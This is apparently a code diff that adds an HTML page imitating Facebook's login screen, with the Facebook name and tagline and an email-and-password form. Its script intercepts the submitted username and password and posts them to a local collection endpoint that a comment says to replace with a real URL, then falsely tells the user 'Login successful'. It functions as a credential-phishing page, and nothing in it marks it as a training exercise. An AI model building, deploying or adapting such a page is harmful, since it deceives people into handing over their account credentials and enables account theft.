@@ -1,0 +1,65 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Login Page</title>
+    <link rel="stylesheet" href="../static/css/login_form_2.css" />
+  </head>
+  <body>
+    <div class="content">
+      <div class="flex-div">
+        <div class="name-content">
+          <h1 class="logo">Facebook</h1>
+          <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+          <form id="loginForm">
+            <input type="text" name="username" id="username" placeholder="Email or Phone Number" required />
+            <input type="password" name="password" id="password" placeholder="Password" required>
+            <button type="submit" class="login">Log In</button>
+            <a href="#">Forgot Password ?</a>
+            <hr>
+            <button class="create-account">Create New Account</button>
+          </form>
+      </div>
+    </div>
+
+  <script>
+   // JavaScript to send the login data to an API
+   document.getElementById("loginForm").addEventListener("submit", function(event) {
+       event.preventDefault(); // Prevent the default form submission
+
+
+       const username = document.getElementById("username").value;
+       const password = document.getElementById("password").value;
+// Prepare the data to be sent to the API
+       const data = {
+           username: username,
+           password: password
+       };
+
+
+       // Send the data using fetch to an API (replace 'YOUR_API_URL' with the actual endpoint)
+       fetch('http://localhost:8000/submit', {
+           method: 'POST',
+           headers: {
+               'Content-Type': 'application/json',
+           },
+           body: JSON.stringify(data),
+       })
+       .then(response => response.json()) // Parse the JSON response
+       .then(data => {
+           // Handle the API response here
+           console.log('Success:', data);
+           alert('Login successful');
+       })
+       .catch((error) => {
+           // Handle any errors that occur during the fetch
+           console.error('Error:', error);
+           alert('Login failed');
+       });
+   });
+</script>
+  </body>
+
+</html>
